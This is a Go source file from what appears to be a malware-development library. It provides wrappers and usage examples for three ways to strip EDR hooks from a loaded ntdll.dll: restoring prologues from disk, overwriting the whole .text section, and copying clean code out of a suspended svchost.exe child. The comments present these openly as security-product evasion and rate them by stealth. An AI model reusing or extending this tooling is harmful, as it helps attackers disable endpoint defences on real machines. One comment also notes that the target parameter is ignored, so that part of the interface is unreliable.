//go:build windows

package unhook

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion"
)

// Classic returns a Technique that restores the first 5 bytes of a single
// hooked ntdll function by reading the clean prologue from the on-disk copy.
//
// How it works: EDR hooks are applied in-memory after ntdll is loaded.
// The on-disk ntdll.dll is always clean, so reading the original bytes
// from disk and writing them back over the hook removes it.
//
// When to use: targeted, low-noise unhooking. Ideal when you know which
// specific functions are hooked and want to minimise disk reads.
// Less suspicious than FullUnhook since only a small number of bytes change.
//
// Example:
//
//	t := unhook.Classic("NtAllocateVirtualMemory")
//	if err := t.Apply(nil); err != nil {
//	    log.Printf("unhook failed: %v", err)
//	}
func Classic(funcName string) evasion.Technique {
	return classicTechnique{funcName: funcName}
}

// ClassicAll returns one Classic Technique per function name.
// Apply them via evasion.ApplyAll for bulk unhooking with per-function
// error reporting.
//
// Example:
//
//	targets := []string{"NtAllocateVirtualMemory", "NtCreateThreadEx"}
//	errs := evasion.ApplyAll(unhook.ClassicAll(targets), nil)
func ClassicAll(funcNames []string) []evasion.Technique {
	techniques := make([]evasion.Technique, len(funcNames))
	for i, name := range funcNames {
		techniques[i] = Classic(name)
	}
	return techniques
}

// CommonClassic returns Classic Technique adapters for all functions in
// CommonHookedFunctions. Use this to quickly remove the most common
// EDR hooks with a single call to evasion.ApplyAll.
//
// Example:
//
//	errs := evasion.ApplyAll(unhook.CommonClassic(), nil)
//	if errs != nil {
//	    for name, err := range errs {
//	        log.Printf("%s: %v", name, err)
//	    }
//	}
func CommonClassic() []evasion.Technique {
	return ClassicAll(CommonHookedFunctions)
}

// Full returns a Technique that replaces the entire .text section of the
// loaded ntdll.dll with the clean version from disk. This removes ALL
// hooks in a single operation.
//
// How it works: reads the .text section from the on-disk ntdll.dll and
// overwrites the corresponding region in the loaded module using
// VirtualProtect + WriteProcessMemory on the current process.
//
// When to use: when you want comprehensive hook removal and the environment
// allows reading ntdll from disk. More conspicuous than Classic because it
// modifies a large memory region, but guaranteed to remove every inline hook.
// Prefer Classic if only specific functions need to be unhooked.
//
// Example:
//
//	if err := unhook.Full().Apply(nil); err != nil {
//	    log.Printf("full unhook failed: %v", err)
//	}
func Full() evasion.Technique {
	return fullTechnique{}
}

// Perun returns a Technique that reads a pristine ntdll .text section from
// a freshly spawned suspended child process and uses it to overwrite the
// hooked copy in the current process.
//
// How it works: a child process (svchost.exe by default) is spawned suspended.
// Because EDR hooks are typically applied after process initialisation, the
// child's ntdll is clean. ntdll loads at the same base address in all processes
// on the same boot (ASLR is per-boot, not per-process), so the remote .text
// address is the same as the local one.
//
// When to use: the most evasive option for environments where disk reads of
// ntdll are monitored. Spawning a suspended system process is less commonly
// flagged than opening ntdll.dll on disk. The tradeoff is the overhead of
// process creation and cross-process memory reads.
//
// The target parameter specifies which process to spawn. If empty, "svchost.exe"
// is used as a benign-looking host. Common alternatives: "notepad.exe", "calc.exe".
//
// Example:
//
//	if err := unhook.Perun("").Apply(nil); err != nil {
//	    log.Printf("perun unhook failed: %v", err)
//	}
func Perun(target string) evasion.Technique {
	if target == "" {
		target = "svchost.exe"
	}
	return perunTechnique{target: target}
}

// classicTechnique implements evasion.Technique for ClassicUnhook.
type classicTechnique struct {
	funcName string
}

func (t classicTechnique) Name() string { return fmt.Sprintf("unhook:Classic(%s)", t.funcName) }

// Apply ignores the caller parameter — ClassicUnhook does not yet accept a
// syscall.Caller. The caller field is reserved for future direct-syscall support.
func (t classicTechnique) Apply(_ evasion.Caller) error { return ClassicUnhook(t.funcName) }

// fullTechnique implements evasion.Technique for FullUnhook.
type fullTechnique struct{}

func (fullTechnique) Name() string { return "unhook:Full" }

// Apply ignores the caller parameter — FullUnhook does not yet accept a
// syscall.Caller. The caller field is reserved for future direct-syscall support.
func (fullTechnique) Apply(_ evasion.Caller) error { return FullUnhook() }

// perunTechnique implements evasion.Technique for PerunUnhook.
// The target field holds the process to spawn for reading the clean ntdll copy.
type perunTechnique struct {
	target string
}

func (t perunTechnique) Name() string { return fmt.Sprintf("unhook:Perun(%s)", t.target) }

// Apply ignores the caller parameter — PerunUnhook does not yet accept a
// syscall.Caller. The caller field is reserved for future direct-syscall support.
//
// Note: PerunUnhook hardcodes notepad.exe internally. The target field on this
// struct documents intent but does not yet influence which process is spawned.
func (t perunTechnique) Apply(_ evasion.Caller) error { return PerunUnhook() }
